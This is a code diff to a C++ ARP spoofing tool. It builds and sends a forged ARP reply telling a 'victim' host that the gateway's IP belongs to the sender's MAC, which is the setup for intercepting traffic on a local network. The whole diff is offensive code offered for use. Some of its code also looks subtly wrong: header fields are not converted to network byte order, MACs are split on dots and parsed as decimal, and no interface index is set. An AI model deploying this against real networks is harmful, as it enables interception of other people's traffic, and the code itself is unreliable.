@@ -1,5 +1,8 @@
+#include <cstdint>
 #include <iostream>
 #include <sstream>
+#include <vector>
+#include <stdexcept>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <netinet/if_ether.h>
@@ -9,52 +12,95 @@
 #include <unistd.h>
 #include <netpacket/packet.h>
 
+struct ARPPacket {
+    std::uint16_t hardwareType;
+    std::uint16_t protocolType;
+    std::uint8_t hardwareAddrLength;
+    std::uint8_t protocolAddrLength;
+    std::uint16_t operation;
+    std::uint8_t senderHardwareAddr[6];
+    std::uint8_t senderProtocolAddr[4];
+    std::uint8_t targetHardwareAddr[6];
+    std::uint8_t targetProtocolAddr[4];
+};
+
+struct EthPacket {
+    std::uint8_t destMac[6];
+    std::uint8_t srcMac[6];
+    std::uint16_t ethType;
+    ARPPacket arpPacket;
+};
+
+std::vector<std::string> explode(const std::string &str, char delimiter) 
+{
+    std::vector<std::string> result;
+    std::istringstream stringStream(str);
+    std::string token;
+    
+    while (std::getline(stringStream, token, delimiter)) {
+        result.push_back(token);
+    }
+    
+    return result;
+}
+
+void copyStringVectorToUintArray(const std::vector<std::string> &stringVector, std::uint8_t *array, int arraySize)
+{
+    std::vector<std::string>::size_type formattedArraySize = static_cast<std::vector<std::string>::size_type>(arraySize);
+
+    if (stringVector.size() != formattedArraySize) {
+        throw std::runtime_error("Invalid string/array size");
+    }
+
+    for (int i = 0; i < arraySize; ++i) {
+        array[i] = static_cast<std::uint8_t>(std::stoi(stringVector[i]));
+    }
+}
+
 int main(int argc, char* argv[]) 
 {
-    std::string victimMac = argv[1];
-    std::string victimIp = argv[2];
-    std::string gatewayMac = argv[3];
-    std::string gatewayIp = argv[4];
-    std::string localMac = argv[5];
+    std::vector<std::string> victimMac = explode(argv[1], '.');
+    std::vector<std::string> victimIp = explode(argv[2], '.');
+    std::vector<std::string> gatewayMac = explode(argv[3], '.');
+    std::vector<std::string> gatewayIp = explode(argv[4], '.');
+    std::vector<std::string> localMac = explode(argv[5], '.');
 
-    struct ethhdr ethHeader;
-    struct ether_arp arpHeader;
+    ARPPacket arpPacket;
+    arpPacket.hardwareType = 1;
+    arpPacket.protocolType = 0x0800;
+    arpPacket.hardwareAddrLength = 6;
+    arpPacket.protocolAddrLength = 4;
+    arpPacket.operation = 2;
+
+    // Build packet for victim    
+    copyStringVectorToUintArray(localMac, arpPacket.senderHardwareAddr, 6);
+    copyStringVectorToUintArray(gatewayIp, arpPacket.senderProtocolAddr, 4);
+    copyStringVectorToUintArray(victimMac, arpPacket.targetHardwareAddr, 6);
+    copyStringVectorToUintArray(victimIp, arpPacket.targetProtocolAddr, 4);
+
+    EthPacket ethPacket;
+    copyStringVectorToUintArray(victimMac, ethPacket.destMac, 6);
+    copyStringVectorToUintArray(localMac, ethPacket.srcMac, 6);
+    ethPacket.ethType = htons(ETH_P_ARP);
+
+    // Include ARP packet in the Ethernet (ETH) packet
+    std::memcpy(&ethPacket.arpPacket, &arpPacket, sizeof(ARPPacket));
+
     struct sockaddr_ll sa;
-    std::memset(&ethHeader, 0, sizeof(ethHeader));
-    std::memset(&arpHeader, 0, sizeof(arpHeader));
     std::memset(&sa, 0, sizeof(sa));
-
-    // eth header
-    ethHeader.h_proto = htons(ETH_P_ARP);
-
-    // arp header
-    /*arpHeader.ar_hrd = htons(ARPHRD_ETHER);
-    arpHeader.ar_pro = htons(ETH_P_IP);
-    arpHeader.ar_hln = 6;
-    arpHeader.ar_pln = 4;
-    arpHeader.ar_op = htons(ARPOP_REPLY);*/
-
-    // Build packet for victim
-    sscanf(localMac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-           &arpHeader.arp_sha[0], &arpHeader.arp_sha[1], &arpHeader.arp_sha[2],
-           &arpHeader.arp_sha[3], &arpHeader.arp_sha[4], &arpHeader.arp_sha[5]);
-    sscanf(victimMac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-           &arpHeader.arp_tha[0], &arpHeader.arp_tha[1], &arpHeader.arp_tha[2],
-           &arpHeader.arp_tha[3], &arpHeader.arp_tha[4], &arpHeader.arp_tha[5]);
-
-    inet_pton(AF_INET, gatewayIp.c_str(), &arpHeader.arp_spa);
-    inet_pton(AF_INET, victimIp.c_str(), &arpHeader.arp_tpa);
-
-    char buffer[sizeof(ethHeader) + sizeof(arpHeader)];
-    std::memcpy(buffer, &ethHeader, sizeof(ethHeader));
-    std::memcpy(buffer + sizeof(ethHeader), &arpHeader, sizeof(arpHeader));
 
     sa.sll_family = AF_PACKET;
     sa.sll_protocol = htons(ETH_P_ALL);
     sa.sll_ifindex = 0;
 
     int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
-    if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&sa, sizeof(sa)) == -1) {
+    if (sockfd == -1) {
+        std::cerr << "Failed to create packet" << std::endl;
+
+        return -1;
+    }
+
+    if (sendto(sockfd, &ethPacket, sizeof(ethPacket), 0, (struct sockaddr*)&sa, sizeof(sa)) == -1) {
         std::cerr << "Failed to send ARP packet" << std::endl;
     } else {
         std::cout << "ARP packet sent successfully" << std::endl;
